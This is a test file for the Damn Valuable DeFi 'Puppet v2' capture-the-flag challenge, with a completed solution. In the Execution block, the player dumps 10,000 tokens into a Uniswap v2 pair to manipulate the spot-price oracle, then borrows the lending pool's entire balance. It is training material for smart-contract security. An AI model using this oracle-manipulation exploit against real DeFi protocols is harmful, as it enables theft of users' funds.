const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require("hardhat");
const { expect } = require("chai");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe("[Challenge] Puppet v2", function () {
  let deployer, player;
  let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;

  // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
  const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
  const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

  const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

  const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.eq(
      PLAYER_INITIAL_ETH_BALANCE
    );

    const UniswapFactoryFactory = new ethers.ContractFactory(
      factoryJson.abi,
      factoryJson.bytecode,
      deployer
    );
    const UniswapRouterFactory = new ethers.ContractFactory(
      routerJson.abi,
      routerJson.bytecode,
      deployer
    );
    const UniswapPairFactory = new ethers.ContractFactory(
      pairJson.abi,
      pairJson.bytecode,
      deployer
    );

    // Deploy tokens to be traded
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    weth = await (await ethers.getContractFactory("WETH", deployer)).deploy();

    // Deploy Uniswap Factory and Router
    uniswapFactory = await UniswapFactoryFactory.deploy(
      ethers.constants.AddressZero
    );
    uniswapRouter = await UniswapRouterFactory.deploy(
      uniswapFactory.address,
      weth.address
    );

    // Create Uniswap pair against WETH and add liquidity
    await token.approve(uniswapRouter.address, UNISWAP_INITIAL_TOKEN_RESERVE);
    await uniswapRouter.addLiquidityETH(
      token.address,
      UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
      0, // amountTokenMin
      0, // amountETHMin
      deployer.address, // to
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_WETH_RESERVE }
    );
    uniswapExchange = await UniswapPairFactory.attach(
      await uniswapFactory.getPair(token.address, weth.address)
    );
    expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);

    // Deploy the lending pool
    lendingPool = await (
      await ethers.getContractFactory("PuppetV2Pool", deployer)
    ).deploy(
      weth.address,
      token.address,
      uniswapExchange.address,
      uniswapFactory.address
    );

    // Setup initial token balances of pool and player accounts
    await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

    // Check pool's been correctly setup
    expect(await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)).to.eq(
      3n * 10n ** 17n
    );
    expect(
      await lendingPool.calculateDepositOfWETHRequired(
        POOL_INITIAL_TOKEN_BALANCE
      )
    ).to.eq(300000n * 10n ** 18n);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    const attackWeth = weth.connect(player);
    const attackToken = token.connect(player);
    const attackRouter = uniswapRouter.connect(player);
    const attackLender = lendingPool.connect(player);

    // Helper function to check balances
    const logBalances = async (address, name) => {
      const ethBal = await ethers.provider.getBalance(address);
      const wethBal = await attackWeth.balanceOf(address);
      const tknBal = await attackToken.balanceOf(address);

      console.log(
        `ETH Balance of ${name} is : ${ethers.utils.formatEther(ethBal)}`
      );
      console.log(
        `WETH Balance of ${name} is : ${ethers.utils.formatEther(wethBal)}`
      );
      console.log(
        `Token Balance of ${name} is : ${ethers.utils.formatEther(tknBal)}`
      );
      console.log("--------------------------------------------------");
    };

    await logBalances(player.address, "Attacker");

    // Approve DVT transfer
    await attackToken.approve(
      attackRouter.address,
      PLAYER_INITIAL_TOKEN_BALANCE
    );

    // Swap 10,000 DVT for WETH
    await attackRouter.swapExactTokensForTokens(
      PLAYER_INITIAL_TOKEN_BALANCE,
      ethers.utils.parseEther("9"),
      [attackToken.address, attackWeth.address],
      player.address,
      (await ethers.provider.getBlock("latest")).timestamp * 2
    );

    console.log("***SWAPPED 10000 TOKENS FOR WETH***");
    await logBalances(player.address, "Attacker");
    await logBalances(uniswapExchange.address, "UniSwapExchange");

    // Calculate deposit required and approve the lending contract for that amount;
    const deposit = await attackLender.calculateDepositOfWETHRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );
    console.log(
      "Required deposit for all tokens is",
      ethers.utils.formatEther(deposit)
    );
    await attackWeth.approve(attackLender.address, deposit);

    // Transfer remaining eth to weth (save some for gas) by sending to contract
    const tx = {
      to: attackWeth.address,
      value: ethers.utils.parseEther("19.9"),
    };
    await player.sendTransaction(tx);

    console.log("***Deposited 19.9 ETH TO WETH***");
    await logBalances(player.address, "Attacker");

    // Verify we have enough WETH to make the deposit
    const wethBalance = attackWeth.balanceOf(player.address);
    // assert(wethBalance >= deposit, "Not enough WETH to take all funds");

    // Request borrow funds
    await attackLender.borrow(POOL_INITIAL_TOKEN_BALANCE, {
      gasLimit: 1e6,
    });

    await logBalances(player.address, "Attacker");
    await logBalances(attackLender.address, "Lender");
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    // Player has taken all tokens from the pool
    expect(await token.balanceOf(lendingPool.address)).to.be.eq(0);

    expect(await token.balanceOf(player.address)).to.be.gte(
      POOL_INITIAL_TOKEN_BALANCE
    );
  });
});
